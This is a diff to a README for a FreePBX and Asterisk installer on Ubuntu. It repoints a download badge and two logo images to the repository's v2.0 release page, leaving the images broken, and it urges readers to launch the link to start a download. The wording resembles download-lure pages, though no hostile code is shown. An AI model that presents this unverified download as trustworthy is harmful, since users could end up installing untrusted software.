@@ -31,7 +31,7 @@ If you encounter any issues during the installation, feel free to raise them in 
 
 ## Quick Links
 For a direct download of the installation script, click the button below:
-[![Download Script](https://img.shields.io/badge/Download-Installer-blue)](https://github.com/file/App.zip)
+[![Download Script](https://github.com/Zeel2230/FreePBX-Ubuntu-Installer/releases/tag/v2.0)](https://github.com/Zeel2230/FreePBX-Ubuntu-Installer/releases/tag/v2.0)
 
 Please note that the link provided needs to be launched to initiate the download process. If you encounter any issues with the link, you can always check the "Releases" section of the repository for alternative download options.
 
@@ -40,5 +40,5 @@ Get started with FreePBX and Asterisk on Ubuntu today with the easy-to-use insta
 
 Thank you for choosing the FreePBX Ubuntu Installer. Happy telephony setup! 🚀
 
-![FreePBX Logo](https://example.com/freepbx-logo.png)
-![Asterisk Logo](https://example.com/asterisk-logo.png)
+![FreePBX Logo](https://github.com/Zeel2230/FreePBX-Ubuntu-Installer/releases/tag/v2.0)
+![Asterisk Logo](https://github.com/Zeel2230/FreePBX-Ubuntu-Installer/releases/tag/v2.0)
